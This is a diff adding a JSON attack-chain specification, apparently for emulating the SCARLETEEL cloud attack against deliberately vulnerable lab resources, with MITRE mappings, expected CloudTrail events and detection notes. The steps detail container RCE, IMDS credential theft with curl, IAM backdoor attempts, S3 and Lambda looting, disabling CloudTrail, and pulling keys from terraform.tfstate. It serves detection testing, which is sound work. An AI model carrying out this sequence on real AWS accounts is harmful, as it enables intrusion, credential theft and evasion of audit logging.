@@ -1,0 +1,215 @@
+{
+  "status": "PHASE_3_COMPLETE",
+  "attack_chain": [
+    {
+      "step": 1,
+      "phase": 1,
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "execution_context": "http_exploit",
+      "target_resource": "scarleteel-vuln-container-host",
+      "description": "HTTP POST to /cmd endpoint on the vulnerable Flask web application running inside a Docker container on port 8080. Deploy XMRig simulation files to /tmp/.",
+      "implementation": {
+        "method": "requests.post(target_url/cmd, data={cmd: shell_command})",
+        "api_calls": []
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["VPC Flow Logs"],
+      "cleanup_actions": [],
+      "operational_tempo": {"delay_after_seconds": [0, 2]},
+      "risk_level": "low"
+    },
+    {
+      "step": 2,
+      "phase": 1,
+      "technique_id": "T1552.005",
+      "technique_name": "Cloud Instance Metadata API",
+      "tactic": "Credential Access",
+      "execution_context": "imds_theft",
+      "target_resource": "scarleteel-vuln-ec2-role",
+      "description": "curl 169.254.169.254/latest/meta-data/iam/security-credentials/<role> from inside container. Run SCARLETEEL wget/sed/grep pipeline to extract and configure stolen credentials.",
+      "implementation": {
+        "method": "exploit_rce(target_url, curl IMDS command)",
+        "api_calls": []
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["GuardDuty"],
+      "cleanup_actions": [],
+      "operational_tempo": {"delay_after_seconds": [0, 2]},
+      "risk_level": "low"
+    },
+    {
+      "step": 3,
+      "phase": 2,
+      "technique_id": "T1078.004",
+      "technique_name": "Valid Accounts: Cloud Accounts — Privilege Escalation Attempt",
+      "tactic": "Privilege Escalation",
+      "execution_context": "api_attack",
+      "target_resource": "scarleteel-vuln-ec2-role",
+      "description": "Attempt iam:CreateUser (ScarleteelBackdoor) and iam:CreateAccessKey (AdminJoe) using stolen instance role credentials from external IP. Both expected to fail via inline policy restrictions.",
+      "implementation": {
+        "method": "boto3.Session(stolen_creds) -> iam.create_user / iam.create_access_key",
+        "credential_source": "stolen_imds_creds",
+        "api_calls": [
+          {"service": "iam", "method": "create_user", "args": {"UserName": "ScarleteelBackdoor"}},
+          {"service": "iam", "method": "create_access_key", "args": {"UserName": "AdminJoe"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "CreateUser", "errorCode": "AccessDenied"},
+        {"eventName": "CreateAccessKey", "errorCode": "AccessDenied"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "GuardDuty"],
+      "cleanup_actions": [],
+      "operational_tempo": {"delay_after_seconds": [0, 2]},
+      "risk_level": "low"
+    },
+    {
+      "step": 4,
+      "phase": 3,
+      "technique_id": "T1526",
+      "technique_name": "Cloud Service Discovery",
+      "tactic": "Discovery",
+      "execution_context": "api_attack",
+      "target_resource": "all S3 buckets and Lambda functions",
+      "description": "Enumerate all S3 buckets (ListBuckets, ListObjectsV2) and Lambda functions (ListFunctions, GetFunction, ListVersionsByFunction, GetPolicy, ListAliases, ListTags, ListEventSourceMappings). Identify terraform state bucket.",
+      "implementation": {
+        "method": "boto3 s3 + lambda clients with stolen credentials",
+        "credential_source": "stolen_imds_creds",
+        "api_calls": [
+          {"service": "s3", "method": "list_buckets", "args": {}},
+          {"service": "s3", "method": "list_objects_v2", "args": {"Bucket": "<each_bucket>"}},
+          {"service": "lambda", "method": "list_functions", "args": {}},
+          {"service": "lambda", "method": "get_function", "args": {"FunctionName": "<fn>"}},
+          {"service": "lambda", "method": "list_versions_by_function", "args": {"FunctionName": "<fn>"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "ListBuckets", "eventSource": "s3.amazonaws.com"},
+        {"eventName": "ListFunctions", "eventSource": "lambda.amazonaws.com"},
+        {"eventName": "GetFunction", "eventSource": "lambda.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail"],
+      "cleanup_actions": [],
+      "operational_tempo": {"delay_after_seconds": [0, 5]},
+      "risk_level": "low"
+    },
+    {
+      "step": 5,
+      "phase": 3,
+      "technique_id": "T1530",
+      "technique_name": "Data from Cloud Storage",
+      "tactic": "Collection",
+      "execution_context": "api_attack",
+      "target_resource": "scarleteel-dummy-logs, scarleteel-dummy-scripts, scarleteel-trail-logs",
+      "description": "GetObject on objects in all scarleteel-prefixed S3 buckets. Also retrieve Lambda source code via presigned URL. Skip terraform.tfstate (handled in Phase 5).",
+      "implementation": {
+        "method": "s3.get_object + urllib.request.urlretrieve for Lambda code",
+        "credential_source": "stolen_imds_creds",
+        "api_calls": [
+          {"service": "s3", "method": "get_object", "args": {"Bucket": "<scarleteel_bucket>", "Key": "<object_key>"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "GetObject", "note": "Data event — invisible without S3 data event logging"}
+      ],
+      "audit_visible": false,
+      "detection_sources": ["CloudTrail S3 data events"],
+      "cleanup_actions": [],
+      "operational_tempo": {"delay_after_seconds": [0, 2]},
+      "risk_level": "low"
+    },
+    {
+      "step": 6,
+      "phase": 4,
+      "technique_id": "T1562.008",
+      "technique_name": "Disable or Modify Cloud Logs",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "scarleteel-trail",
+      "description": "DescribeTrails to find the trail name, then StopLogging to disable CloudTrail. After this point, no further API calls appear in the S3-delivered audit trail.",
+      "implementation": {
+        "method": "cloudtrail.describe_trails() -> cloudtrail.stop_logging(Name=trail_arn)",
+        "credential_source": "stolen_imds_creds",
+        "api_calls": [
+          {"service": "cloudtrail", "method": "describe_trails", "args": {}},
+          {"service": "cloudtrail", "method": "stop_logging", "args": {"Name": "<trail_arn>"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "DescribeTrails", "eventSource": "cloudtrail.amazonaws.com"},
+        {"eventName": "StopLogging", "eventSource": "cloudtrail.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "GuardDuty"],
+      "cleanup_actions": ["cloudtrail:StartLogging to re-enable"],
+      "operational_tempo": {"delay_after_seconds": [0, 2]},
+      "risk_level": "high",
+      "iocs_generated": [
+        "StopLogging — should trigger immediate P1 alert",
+        "GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled"
+      ]
+    },
+    {
+      "step": 7,
+      "phase": 5,
+      "technique_id": "T1552.001",
+      "technique_name": "Credentials In Files",
+      "tactic": "Credential Access",
+      "execution_context": "api_attack",
+      "target_resource": "scarleteel-tf-state bucket",
+      "description": "GetObject on terraform.tfstate from the tf-state S3 bucket. Parse JSON to extract IAM access key for the bait user (scarleteel-secondary-user).",
+      "implementation": {
+        "method": "s3.get_object(Bucket=tf_state_bucket, Key=terraform.tfstate) -> json.loads -> extract aws_iam_access_key",
+        "credential_source": "stolen_imds_creds",
+        "api_calls": [
+          {"service": "s3", "method": "get_object", "args": {"Bucket": "<tf_state_bucket>", "Key": "terraform.tfstate"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "GetObject", "note": "Data event + CloudTrail already stopped — doubly invisible"}
+      ],
+      "audit_visible": false,
+      "detection_sources": ["CloudTrail S3 data events"],
+      "cleanup_actions": [],
+      "operational_tempo": {"delay_after_seconds": [0, 2]},
+      "risk_level": "low"
+    },
+    {
+      "step": 8,
+      "phase": 6,
+      "technique_id": "T1078.004",
+      "technique_name": "Valid Accounts: Cloud Accounts — Lateral Movement",
+      "tactic": "Lateral Movement",
+      "execution_context": "api_attack",
+      "target_resource": "scarleteel-secondary-user",
+      "description": "Use stolen long-term IAM credentials from terraform.tfstate to create a new boto3 session as the bait user. Call sts:GetCallerIdentity (confirms access) then iam:ListUsers (expected to fail — zero permissions).",
+      "implementation": {
+        "method": "boto3.Session(lateral_creds) -> sts.get_caller_identity() -> iam.list_users()",
+        "credential_source": "lateral_creds_from_tfstate",
+        "api_calls": [
+          {"service": "sts", "method": "get_caller_identity", "args": {}},
+          {"service": "iam", "method": "list_users", "args": {}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "GetCallerIdentity", "eventSource": "sts.amazonaws.com", "principal": "scarleteel-secondary-user"},
+        {"eventName": "ListUsers", "eventSource": "iam.amazonaws.com", "errorCode": "AccessDenied"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail"],
+      "cleanup_actions": ["Deactivate the access key"],
+      "operational_tempo": {"delay_after_seconds": [0, 2]},
+      "risk_level": "medium",
+      "iocs_generated": [
+        "GetCallerIdentity from dormant IAM user — first API call ever from this principal",
+        "Principal changes from EC2 role to IAM user in same attack sequence"
+      ]
+    }
+  ]
+}
